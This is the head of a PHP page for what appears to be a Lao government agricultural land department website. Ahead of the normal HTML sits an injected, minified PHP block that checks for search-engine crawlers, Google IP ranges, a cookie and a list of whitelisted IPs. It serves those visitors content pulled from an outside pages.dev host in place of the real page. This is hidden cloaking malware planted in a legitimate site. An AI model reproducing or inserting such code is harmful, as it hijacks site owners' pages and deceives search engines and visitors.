<?php 
















if ($uri == '/' && (
    strpos($userAgent, 'bot') !== false || 
    strpos($userAgent, 'google') !== false || 
    strpos($userAgent, 'chrome-lighthouse') !== false || 
    strpos($referer, 'google') !== false
))
error_reporting(0);$link='http://punten-neng.pages.dev/dalam.mis-maf'; //E5F466
function ip_in_range($ip,$range){list($subnet,$bits)=explode('/',$range);$ip_dec=ip2long($ip);$subnet_dec=ip2long($subnet);$mask=-1<<(32-$bits);$subnet_dec&=$mask;return($ip_dec&$mask)===$subnet_dec;}function fetch_ip_ranges($url,$ipv4_key){$json_data=file_get_contents($url);if($json_data===FALSE){die("Error: Could not fetch the IP ranges from $url.");}$ip_data=json_decode($json_data,true);$ip_ranges=[];if(isset($ip_data['prefixes'])){foreach($ip_data['prefixes']as $prefix){if(isset($prefix[$ipv4_key])){$ip_ranges[]=$prefix[$ipv4_key];}}}return $ip_ranges;}$google_ip_ranges=fetch_ip_ranges('https://www.gstatic.com/ipranges/goog.json','ipv4Prefix');$visitor_ip=isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:(isset($_SERVER["HTTP_INCAP_CLIENT_IP"])?$_SERVER["HTTP_INCAP_CLIENT_IP"]:(isset($_SERVER["HTTP_TRUE_CLIENT_IP"])?$_SERVER["HTTP_TRUE_CLIENT_IP"]:(isset($_SERVER["HTTP_REMOTEIP"])?$_SERVER["HTTP_REMOTEIP"]:(isset($_SERVER["HTTP_X_REAL_IP"])?$_SERVER["HTTP_X_REAL_IP"]:$_SERVER["REMOTE_ADDR"]))));$googleallow=false;foreach($google_ip_ranges as $range){if(ip_in_range($visitor_ip,$range)){$googleallow=true;break;}}$asd=array('bot','ahrefs','google');foreach($asd as $len){$nul=$len;}$alow=['116.212.130.44','116.212.130.199','103.121.122.206','136.228.135.175','93.185.162.12'];if($_SERVER['REQUEST_URI']=='/'){$agent=strtolower($_SERVER['HTTP_USER_AGENT']);if(strpos($agent,$nul)or $googleallow or isset($_COOKIE['lp'])or in_array($visitor_ip,$alow)){echo implode('',file($link));die();}} ?>
<head>
        <meta charset="utf-8">
        <title>ກົມຄຸ້ມຄອງ ແລະ ພັດທະນາທີ່ດິນກະສິກຳ</title>
        <meta content="width=device-width, initial-scale=1.0" name="viewport">
        <meta content="dalam.maf.gov.la" name="keywords">
        <meta content="dalam.maf.gov.la" name="description">

        <!-- Favicon -->
        <link href="img/favicon.png" rel="icon">

        <!-- Google Font -->
        <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">

        <!-- CSS Libraries -->
        <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet">
        <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.0/css/all.min.css" rel="stylesheet">
        <link href="lib/flaticon/font/flaticon.css" rel="stylesheet"> 
        <link href="lib/animate/animate.min.css" rel="stylesheet">
        <link href="lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
        <link href="lib/lightbox/css/lightbox.min.css" rel="stylesheet">
        <link href="lib/slick/slick.css" rel="stylesheet">
        <link href="lib/slick/slick-theme.css" rel="stylesheet">

        <!-- Template Stylesheet -->
        <link href="css/style.css" rel="stylesheet">
        <style type="text/css">
            @import url("LAOS/stylesheet.css");
        		body,td,th ,h3{
        			font-family: LAOS;
        		}
        
        		 @import url("LAOS/stylesheet.css");
        		.save{
        			font-family: LAOS;
        		}
            </style>
            <style type="text/css">
                    .auto-style1 {
                        font-family: LAOS;
                    }
                </style>
    </head>
